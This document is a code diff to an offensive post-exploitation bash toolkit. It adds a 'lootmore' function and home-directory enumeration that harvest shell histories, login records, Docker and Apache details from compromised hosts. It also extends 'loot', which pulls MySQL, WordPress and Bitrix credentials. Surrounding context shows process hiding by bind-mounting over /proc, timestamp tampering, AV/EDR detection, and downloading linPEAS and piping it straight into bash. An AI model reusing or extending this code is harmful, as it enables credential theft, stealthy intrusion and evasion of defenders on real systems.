@@ -15,6 +15,7 @@
 #
 # Environment variables (optional):
 #    XHOME=         Set custom XHOME directory [default: /dev/shm/.$'\t''~?$:?']
+#    HOMEDIR=       Loot location of /home [default: /home]
 #
 # 2024 by theM0ntarCann0n & skpr
 
@@ -338,7 +339,7 @@ transfer() {
 # SHRED without shred command
 command -v shred >/dev/null || shred() {
     [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
-    dd status=none bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
+    dd status=none bs=1k count="$(du -sk "${1:?}" | cut -f1)" if=/dev/urandom >"$1"
     rm -f "${1:?}"
 }
 
@@ -451,7 +452,7 @@ hide() {
         [ -n "$ts_d" ] && touch -t "$ts_d" /etc
         HS_WARN "Use ${CDC}ctime /etc /etc/mtab${CDM} to fix ctime"
     }
-    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && HS_INFO "PID $_pid is now hidden"; return; }
+    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm "/proc/$_pid" && HS_INFO "PID $_pid is now hidden"; return; }
     local _argstr
     for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
     [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
@@ -593,7 +594,7 @@ hgrep() {
 }
 
 dbin() {
-    local cdir tfn
+    local cdir
     { [ -n "${XHOME}" ] && [ -f "${XHOME}/dbin" ]; } || { bin dbin || return; }
 
     cdir="${XHOME}/.dbin"
@@ -606,13 +607,13 @@ dbin() {
 }
 
 bin() {
-    local arch="$(uname -m)"
-    local arch_alt
-    local os="$(uname -s)"
+    local arch arch_alt os
     local a
     local single="${1}"
     local is_showhelp=1
 
+    arch="$(uname -m)"
+    os="$(uname -s)"
     [ -z "$os" ] && os="Linux"
     [ -z "$arch" ] && arch="x86_64"
     [ -n "$single" ] && {
@@ -752,8 +753,9 @@ _loot_wp() {
 
 # _loot_home <NAME> <filename>
 _loot_homes() {
-    local fn
-    for fn in "${HOMEDIR:-/home}"/*/"${2:?}" /root/"${2}"; do
+    local fn hn
+    for hn in "${HOMEDIRARR[@]}"; do
+        fn="${hn}/${2:?}"
         [ ! -s "$fn" ] && continue
         echo -e "${CB}${1:-CREDS} ${CDY}${fn}${CF}"
         cat "$fn"
@@ -879,7 +881,7 @@ _warn_edr() {
     [ -e /etc/clamd.d/scan.conf ] && fns+=("/etc/clamd.d/scan.conf")
     [ -e /etc/freshclam.conf ] && fns+=("/etc/freshclam.conf")
 
-    [ -n "$fns" ] && {
+    [ "${#fns[@]}" -ne 0 ] && {
         echo -e "${CR}AV/EDR found${CF}"
         \ls -alrt "${fns[@]}"
         echo -en "${CN}"
@@ -891,6 +893,26 @@ _warn_edr() {
         echo "$out"
         echo -en "${CN}"
     }
+}
+
+_hs_gen_home() {
+    local IFS
+    local str
+    unset HOMEDIRARR
+
+    if [ -n "$HOMEDIR" ]; then
+        if [ -d "$HOMEDIR" ]; then
+            str="$({ find "${HOMEDIR}" -mindepth 1 -maxdepth 1 -type d; } | sort -u)"
+        else
+            HS_WARN "Directory not found: HOMEDIR='${HOMEDIR}'"
+        fi
+    else
+        str="$({ find "${HOMEDIR:-/home}" -mindepth 1 -maxdepth 1 -type d; awk -F':' '{print $6}' </etc/passwd 2>/dev/null | while read -r d; do [ -d "$d" ] && echo "$d"; done; [ -d /var/www ] && echo "/var/www"; } | sort -u)"
+    fi
+
+    set -f
+    IFS=$'\n' HOMEDIRARR=($str)
+    set +f
 }
 
 lootlight() {
@@ -950,23 +972,99 @@ lootlight() {
     _warn_edr
 }
 
+lootmore() {
+    local hn fn str arr
+    _hs_gen_home
+
+    # Find interesting commands in history file
+    for hn in "${HOMEDIRARR[@]}"; do
+        fn=()
+        [ -f "${hn}/.bash_history" ] && fn+=("${hn}/.bash_history")
+        [ -f "${hn}/.zsh_history" ] && fn+=("${hn}/.zsh_history")
+        [ ${#fn[@]} -eq 0 ] && continue
+        str="$(grep -h -e ^ssh -e ^scp -e ^sftp -e ^rsync -e ^git -e ^rclone "${fn[@]}" 2>/dev/null | sort -u)"
+
+        [ -z "$str" ] && continue
+        echo -e "${CB}Interesting commands ${CDY}${hn}/.[bash|zsh]_history${CF}"
+        echo "$str"
+    done
+    echo -en "${CN}"
+
+    command -v lastlog >/dev/null && {
+        echo -e "${CB}Logins ${CDY}${CF}"
+        lastlog | grep -vF 'Never logged'
+        echo -en "${CN}"
+    }
+    command -v last >/dev/null && {
+        echo -e "${CB}Last Logins ${CDY}${CF}"
+        last -i -n20
+        echo -en "${CN}"
+    }
+
+    str="$(dmesg -T 2>/dev/null | tail -n 10)"
+    [ -n "$str" ] && {
+        echo -e "${CB}dmesg ${CDY}${CF}"
+        echo "$str"
+        echo -en "${CN}"
+    }
+
+    command -v docker >/dev/null && {
+        str="$(docker ps -a)"
+        [ -n "$str" ] && {
+            echo -e "${CB}Docker ${CDY}${CF}"
+            echo "$str"
+            echo -en "${CN}"
+        }
+    }
+    # Execute in subshell so that 'source' does not mess with our variables.
+    (source /etc/apache2/envvars 2>/dev/null && {
+        unset str
+        set -f
+        IFS=$'\n' arr=($(ps auxw|awk '{print $11}'|grep -e "[a]pache" -e "[h]ttpd"|grep -v lighttpd|sort -u))
+        set +f
+        for b in "${arr[@]}"; do
+            grep -Fqs apr_socket_timeout_set "$b" || continue
+            str+="$("$b" -t -D DUMP_VHOSTS 2>&1)" || continue
+        done
+        [ -n "$str" ] && {
+            echo -e "${CB}Apache Config ${CDY}${CF}"
+            echo "$str"
+            echo -en "${CN}"
+        }
+    })
+
+    str="$(grep -sE '^[[:digit:]]' /etc/hosts |grep -vF -e localhost -e 127.0.0.1)"
+    [ -n "$str" ] && {
+        echo -e "${CB}/etc/hosts ${CDY}${CF}"
+        echo "$str"
+        echo -en "${CN}"
+    }
+
+    unset HOMEDIRARR
+    echo -e "${CW}TIP:${CN} Type ${CDC}ws${CN} to find out more about this host."
+}
+
 # Someone shall implement a sub-set from TeamTNT's tricks (use
 # noseyparker for cpu/time-intesive looting). TeamTNT's infos:
 # https://malware.news/t/cloudy-with-a-chance-of-credentials-aws-targeting-cred-stealer-expands-to-azure-gcp/71346
 # https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker
 loot() {
     local h="${_HS_HOME_ORIG:-$HOME}"
-    local str
+    local str hn fn
 
+    _hs_gen_home
     unset _HS_GOT_SSRF_169
-    for fn in "${HOMEDIR:-/home}"/*/.my.cnf /root/.my.cnf; do
+    
+    for hn in "${HOMEDIRARR[@]}"; do
+        fn="${hn}/.my.cnf"
         [ ! -s "$fn" ] && continue
         echo -e "${CB}MySQL ${CDY}${fn}${CF}"
         grep -vE "^(#|\[)" <"${fn}"
         echo -en "${CN}"
         # grep -E "^(user|password)" "${h}/.my"
     done
-    for fn in "${HOMEDIR:-/home}"/*/.mysql_history /root/.mysql_history; do
+    for hn in "${HOMEDIRARR[@]}"; do
+        fn="${hn}/.mysql_history"
         [ ! -s "$fn" ] && continue
         str=$(grep -ia '^SET PASSWORD FOR' "$fn") || continue
         echo -e "${CB}MySQL ${CDY}${fn}${CF}"
@@ -975,15 +1073,18 @@ loot() {
     done
 
     ### Bitrix
-    for fn in "${HOMEDIR:-/home}"/*/*/bitrix/.settings.php; do
+    # for hn in "${HOMEDIRARR[@]}"; do
+    #     [[ "$hn" == "/var/www"* ]] && continue
+    #     for fn in "${hn}"/*/bitrix/.settings.php; do
+    #         loot_bitrix "$fn"
+    #     done
+    # done
+
+    find "${HOMEDIRARR[@]}" -maxdepth 6 -type f -wholename "*/bitrix/.settings.php" 2>/dev/null | while read -r fn; do
         loot_bitrix "$fn"
     done
 
-    find /var/www -maxdepth 6 -type f -wholename "*/bitrix/.settings.php" 2>/dev/null | while read -r fn; do
-        loot_bitrix "$fn"
-    done
-
-    find /var/www "${h}" -maxdepth 3 -type f -name wp-config.php 2>/dev/null | while read -r fn; do
+    find "${HOMEDIRARR[@]}" -maxdepth 3 -type f -name wp-config.php 2>/dev/null | while read -r fn; do
         _loot_wp "$fn"
     done
 
@@ -1030,6 +1131,8 @@ loot() {
     }
 
     lootlight
+    unset HOMEDIRARR
+    echo -e "${CW}TIP:${CN} Type ${CDC}lootmore${CN} to loot even more."
 }
 
 # Try to find LPE
@@ -1043,7 +1146,7 @@ lpe() {
             echo -e "${CB}Running linPEAS...${CN}"
             dl 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh' | bash
             ;;
-        CYGWIN*|MINGW*|MSYS*|MINGW32*|MINGW64*|MSYS_NT*)
+        CYGWIN*|MINGW*|MSYS*)
             echo -e "${CB}Running winPEAS...${CN}"
             if command -v powershell >/dev/null 2>&1; then
                 echo -e "${CB}Using PowerShell to download and execute winPEAS...${CN}"
